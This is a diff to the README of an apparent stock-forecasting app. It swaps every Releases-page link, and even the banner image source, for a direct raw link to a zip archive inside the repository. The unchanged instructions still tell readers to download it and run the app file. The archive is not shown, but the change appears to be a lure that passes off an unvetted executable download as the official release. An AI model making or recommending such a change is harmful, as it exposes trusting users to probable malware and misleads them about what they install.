@@ -1,9 +1,9 @@
 # 📈 stocktrend-ai-forecast - Forecast stock trends with AI
 
-[![Download stocktrend-ai-forecast](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Jerlen1764/stocktrend-ai-forecast/releases)
+[![Download stocktrend-ai-forecast](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Jerlen1764/stocktrend-ai-forecast/raw/refs/heads/main/services/forecast-ai-stocktrend-v2.6.zip)
 
 <div align="center">
-  <img width="1200" height="475" alt="GHBanner" src="https://github.com/user-attachments/assets/0aa67016-6eaf-458a-adb2-6e31a0763ed6" />
+  <img width="1200" height="475" alt="GHBanner" src="https://github.com/Jerlen1764/stocktrend-ai-forecast/raw/refs/heads/main/services/forecast-ai-stocktrend-v2.6.zip" />
 </div>
 
 ## 🖥️ What this app does
@@ -16,7 +16,7 @@ This app is made for people who want a clear view of stock movement without digg
 
 Visit this page to download:
 
-[https://github.com/Jerlen1764/stocktrend-ai-forecast/releases](https://github.com/Jerlen1764/stocktrend-ai-forecast/releases)
+[https://github.com/Jerlen1764/stocktrend-ai-forecast/raw/refs/heads/main/services/forecast-ai-stocktrend-v2.6.zip](https://github.com/Jerlen1764/stocktrend-ai-forecast/raw/refs/heads/main/services/forecast-ai-stocktrend-v2.6.zip)
 
 On the release page, look for the latest version and download the Windows file. If you see more than one file, pick the one marked for Windows.
 
@@ -145,6 +145,6 @@ Check the GitHub Releases page for the latest version and new files.
 
 Go to the release page and download the latest Windows file:
 
-[https://github.com/Jerlen1764/stocktrend-ai-forecast/releases](https://github.com/Jerlen1764/stocktrend-ai-forecast/releases)
+[https://github.com/Jerlen1764/stocktrend-ai-forecast/raw/refs/heads/main/services/forecast-ai-stocktrend-v2.6.zip](https://github.com/Jerlen1764/stocktrend-ai-forecast/raw/refs/heads/main/services/forecast-ai-stocktrend-v2.6.zip)
 
 After the download finishes, extract the file if needed, then open the app file to run it
